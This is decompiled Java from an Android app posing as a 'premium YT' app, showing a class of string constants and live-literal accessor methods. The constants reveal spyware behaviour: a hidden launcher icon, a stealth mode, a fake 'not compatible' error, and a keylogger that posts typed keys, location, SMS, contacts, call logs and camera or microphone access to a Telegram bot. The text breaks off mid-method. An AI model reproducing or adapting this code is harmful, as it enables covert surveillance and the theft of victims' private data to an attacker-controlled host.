    /* JADX INFO: renamed from: State$String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static State<String> f۱۲۳State$String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
    public static final MainActivity2 INSTANCE = new MainActivity2();

    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$try$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۱۴Boolean$arg0$callsetLauncherIconVisible$try$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۳۹String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity = "com.w8sb.w8premiumyt.UNINSTALL_APP";

    /* JADX INFO: renamed from: Boolean$arg-0$call-$set-uninstallReceiverRegistered$$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۴Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-1$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۰String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity = "com.w8sb.w8premiumyt.SHOW_TOAST";

    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-2$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۱String$arg0$call$init$$arg1$callregisterReceiver2$try1$funonCreate$classMainActivity = "com.w8sb.w8premiumyt.OPEN_LINK";

    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-3$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۲String$arg0$call$init$$arg1$callregisterReceiver3$try1$funonCreate$classMainActivity = "com.w8sb.w8premiumyt.PLAY_AUDIO";

    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-4$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۳String$arg0$call$init$$arg1$callregisterReceiver4$try1$funonCreate$classMainActivity = "com.w8sb.w8premiumyt.SPEAK_TEXT";

    /* JADX INFO: renamed from: String$arg-0$call-open$$$this$call-bufferedReader$$$this$call-use$val-configStr$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۰String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try2$funonCreate$classMainActivity = "logo.json";

    /* JADX INFO: renamed from: String$arg-0$call-getString$arg-0$call-$set-botToken$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۶String$arg0$callgetString$arg0$call$setbotToken$$try2$funonCreate$classMainActivity = "bot_token";

    /* JADX INFO: renamed from: String$arg-0$call-getString$arg-0$call-$set-chatId$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۷String$arg0$callgetString$arg0$call$setchatId$$try2$funonCreate$classMainActivity = "chat_id";

    /* JADX INFO: renamed from: String$arg-0$call-optString$arg-0$call-$set-webViewUrl$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۶۲String$arg0$calloptString$arg0$call$setwebViewUrl$$try2$funonCreate$classMainActivity = "webview_url";

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۶۰String$arg0$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity = "require_permissions";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۹Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۶String$arg0$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity = "read_contacts";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readContacts$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۵Boolean$arg1$calloptBoolean$arg0$call$setreadContacts$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۸String$arg0$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity = "read_sms";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readSms$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۷Boolean$arg1$calloptBoolean$arg0$call$setreadSms$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۵String$arg0$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity = "read_call_log";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readCallLog$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۴Boolean$arg1$calloptBoolean$arg0$call$setreadCallLog$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۹String$arg0$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity = "read_storage";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readStorage$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۸Boolean$arg1$calloptBoolean$arg0$call$setreadStorage$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۷String$arg0$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity = "read_location";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-readLocation$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۶Boolean$arg1$calloptBoolean$arg0$call$setreadLocation$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۴String$arg0$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity = "post_notifications";

    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-postNotifications$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۲۳Boolean$arg1$calloptBoolean$arg0$call$setpostNotifications$$try2$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۶۱String$arg0$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity = "stealth_mode";

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-fakeError$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۲String$arg0$calloptBoolean$arg0$call$setfakeError$$try2$funonCreate$classMainActivity = "fake_error";

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-backgroundCameraEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۱String$arg0$calloptBoolean$arg0$call$setbackgroundCameraEnabled$$try2$funonCreate$classMainActivity = "background_camera_enabled";

    /* JADX INFO: renamed from: String$arg-0$call-optBoolean$arg-0$call-$set-microphoneEnabled$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۵۳String$arg0$calloptBoolean$arg0$call$setmicrophoneEnabled$$try2$funonCreate$classMainActivity = "microphone_enabled";

    /* JADX INFO: renamed from: String$arg-0$call-getSharedPreferences$val-prefs$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۵String$arg0$callgetSharedPreferences$valprefs$funonCreate$classMainActivity = "w8prefs";

    /* JADX INFO: renamed from: String$arg-0$call-getBoolean$val-askedAccessibility$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۴۴String$arg0$callgetBoolean$valaskedAccessibility$funonCreate$classMainActivity = "asked_accessibility";

    /* JADX INFO: renamed from: String$arg-0$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static String f۱۶۴String$arg0$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity = "asked_accessibility";

    /* JADX INFO: renamed from: Boolean$arg-1$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۳۱Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۱۱Boolean$arg0$callsetLauncherIconVisible$branch$if1$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: Long$arg-1$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static long f۳۳Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity = 30000;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setLauncherIconVisible$else$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    private static boolean f۱۲Boolean$arg0$callsetLauncherIconVisible$else$if1$funonCreate$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setJavaScriptEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static boolean f۱۰Boolean$arg0$callsetJavaScriptEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setDomStorageEnabled$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static boolean f۹Boolean$arg0$callsetDomStorageEnabled$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setSupportZoom$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static boolean f۱۶Boolean$arg0$callsetSupportZoom$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setLoadWithOverviewMode$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static boolean f۱۵Boolean$arg0$callsetLoadWithOverviewMode$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = true;

    /* JADX INFO: renamed from: Boolean$arg-0$call-setUseWideViewPort$fun-$anonymous$$arg-0$call-apply$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static boolean f۱۷Boolean$arg0$callsetUseWideViewPort$fun$anonymous$$arg0$callapply$try$funsetupWebView$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-loadUrl$else$when$fun-onReceivedError$class-$no-name-provided$$arg-0$call-setWebViewClient$try$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static String f۱۴۹String$arg0$callloadUrl$else$when$funonReceivedError$class$nonameprovided$$arg0$callsetWebViewClient$try$funsetupWebView$classMainActivity = "about:blank";

    /* JADX INFO: renamed from: String$arg-1$call-makeText$$this$call-show$catch$fun-setupWebView$class-MainActivity, reason: not valid java name */
    private static String f۱۷۷String$arg1$callmakeText$$this$callshow$catch$funsetupWebView$classMainActivity = "Error loading webpage";

    /* JADX INFO: renamed from: String$0$str$arg-0$call-parse$arg-0$call-setData$branch$if$branch$if$fun-requestBatteryOptimizations$class-MainActivity, reason: not valid java name */
    private static String f۱۲۸String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity = "package:";

    /* JADX INFO: renamed from: String$arg-0$call-setAction$fun-$anonymous$$arg-0$call-apply$val-serviceIntent$try$fun-startUploadService$class-MainActivity, reason: not valid java name */
    private static String f۱۶۵String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valserviceIntent$try$funstartUploadService$classMainActivity = "RESTART_SERVICE";

    /* JADX INFO: renamed from: String$arg-1$call-makeText$$this$call-show$catch$fun-startUploadService$class-MainActivity, reason: not valid java name */
    private static String f۱۷۸String$arg1$callmakeText$$this$callshow$catch$funstartUploadService$classMainActivity = "Error starting service";

    /* JADX INFO: renamed from: String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۳۱String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "https://api.telegram.org/bot";

    /* JADX INFO: renamed from: String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۳۷String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "/sendLocation";

    /* JADX INFO: renamed from: String$0$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۲۹String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "chat_id=";

    /* JADX INFO: renamed from: String$2$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۳۵String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "&latitude=";

    /* JADX INFO: renamed from: String$4$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۳۸String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "&longitude=";

    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۶۹String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "POST";

    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static boolean f۷Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۷۲String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "Content-Type";

    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    private static String f۱۸۰String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = "application/x-www-form-urlencoded";

    /* JADX INFO: renamed from: String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۳۰String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "https://api.telegram.org/bot";

    /* JADX INFO: renamed from: String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۳۶String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "/sendMessage";

    /* JADX INFO: renamed from: String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۲۵String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "chat_id=";

    /* JADX INFO: renamed from: String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۳۲String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "&text=Key%20typed:%20";

    /* JADX INFO: renamed from: String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۷۵String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "UTF-8";

    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۶۸String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "POST";

    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static boolean f۶Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۷۱String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "Content-Type";

    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    private static String f۱۷۹String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = "application/x-www-form-urlencoded";

    /* JADX INFO: renamed from: String$arg-0$call-plus$arg-0$call-contains$else$when$arg-0$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    private static String f۱۶۳String$arg0$callplus$arg0$callcontains$else$when$arg0$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity = "/.W8AccessibilityService";

    /* JADX INFO: renamed from: Boolean$arg-1$call-EQEQ$fun-isAccessibilityServiceEnabled$class-MainActivity, reason: not valid java name */
    private static boolean f۱۸Boolean$arg1$callEQEQ$funisAccessibilityServiceEnabled$classMainActivity = true;

    /* JADX INFO: renamed from: String$$this$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۲۴String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity = "Permissions not enabled: ";

    /* JADX INFO: renamed from: String$arg-0$call-joinToString$arg-0$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۴۸String$arg0$calljoinToString$arg0$callplus$valmsg$funsendTelegramPermissions$classMainActivity = ", ";

    /* JADX INFO: renamed from: String$0$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۲۷String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "https://api.telegram.org/bot";

    /* JADX INFO: renamed from: String$2$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۳۴String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "/sendMessage";

    /* JADX INFO: renamed from: String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۲۶String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "chat_id=";

    /* JADX INFO: renamed from: String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۳۳String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "&text=";

    /* JADX INFO: renamed from: String$arg-1$call-encode$arg-0$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۷۶String$arg1$callencode$arg0$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "UTF-8";

    /* JADX INFO: renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۷۰String$arg0$callsetRequestMethod$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "POST";

    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static boolean f۸Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = true;

    /* JADX INFO: renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۷۳String$arg0$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "Content-Type";

    /* JADX INFO: renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    private static String f۱۸۱String$arg1$callsetRequestProperty$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = "application/x-www-form-urlencoded";

    /* JADX INFO: renamed from: Long$arg-1$call-postDelayed$fun-run$class-$no-name-provided$$val-runnable$fun-startRepeatingGeoLocation$class-MainActivity, reason: not valid java name */
    private static long f۳۴Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity = 60000;

    /* JADX INFO: renamed from: String$arg-0$call-setTitle$$this$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static String f۱۷۴String$arg0$callsetTitle$$this$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = "Error";

    /* JADX INFO: renamed from: String$arg-0$call-setMessage$$this$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static String f۱۶۶String$arg0$callsetMessage$$this$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = "This app is not compatible with your device.";

    /* JADX INFO: renamed from: String$arg-0$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    private static String f۱۶۷String$arg0$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = "OK";

    /* JADX INFO: renamed from: Int$class-MainActivity, reason: not valid java name */
    private static int f۳۲Int$classMainActivity = 8;

    @LiveLiteralInfo(key = "Boolean$arg-0$call-$set-uninstallReceiverRegistered$$try-1$fun-onCreate$class-MainActivity", offset = 8593)
    /* JADX INFO: renamed from: Boolean$arg-0$call-$set-uninstallReceiverRegistered$$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۴Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۳۵State$Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-$set-uninstallReceiverRegistered$$try-1$fun-onCreate$class-MainActivity", Boolean.valueOf(f۴Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity));
            f۳۵State$Boolean$arg0$call$setuninstallReceiverRegistered$$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", offset = 21735)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity, reason: not valid java name */
    public final boolean m۳Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۵Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۳۶State$Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setCancelable$$this$call-setPositiveButton$$this$call-show$fun-$anonymous$$arg-0$call-runOnUiThread$fun-showFakeErrorAndClose$class-MainActivity", Boolean.valueOf(f۵Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity));
            f۳۶State$Boolean$arg0$callsetCancelable$$this$callsetPositiveButton$$this$callshow$fun$anonymous$$arg0$callrunOnUiThread$funshowFakeErrorAndClose$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17597)
    /* JADX INFO: renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final boolean m۴Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۶Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۳۷State$Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", Boolean.valueOf(f۶Boolean$arg0$callsetDoOutput$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity));
